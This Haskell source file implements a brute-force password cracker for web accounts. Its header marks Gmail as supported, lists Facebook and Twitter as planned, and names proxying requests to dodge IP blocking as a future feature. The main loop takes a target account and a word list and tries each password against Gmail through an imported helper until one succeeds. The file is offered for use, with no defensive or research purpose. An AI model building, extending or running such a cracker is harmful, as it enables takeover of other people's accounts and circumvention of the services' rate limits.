---------------------------------------------------------------------
-- crackers.hs
-- By:
--
-- ___  ___
-- |  \/  |
-- | .  . | ___  _ __ ___   ___
-- | |\/| |/ _ \| '_ ` _ \ / _ \
-- | |  | | (_) | | | | | | (_) |
-- \_|  |_/\___/|_| |_| |_|\___/
--
--
-- Brute force website password crackers
--
-- Wish list:
--
--   [X] Gmail
--   [] Facebook
--   [] Twitter
--
-- Other features and things to do:
--
--   [X] Build in word list
--   [X] Custom word list param
--   [] Proxy requests so that IP doesn't get blocked
--
-- Suggest another at: https://github.com/mom0/crackers/issues
--
---------------------------------------------------------------------

import System.Environment
import Crackers.Gmail

type Password = String

data Crack = Cracked Password | NotCracked deriving (Show)

printShow s = putStrLn $ show s

findPassword :: (Password -> IO (Password, Bool)) -> [String] -> IO Crack
findPassword f [] = do return (NotCracked)
findPassword f (p:ps) = do
  (password, works) <- f p

  if works then return (Cracked password) else findPassword f ps

main :: IO ()
main = do

  args <- getArgs

  passwords <- readFile (if (length args == 1)
    then "data/wordlist.txt"
    else (args!!1))

  result <- (findPassword (gmailCredsWork (args!!0)) (lines passwords))

  printShow result
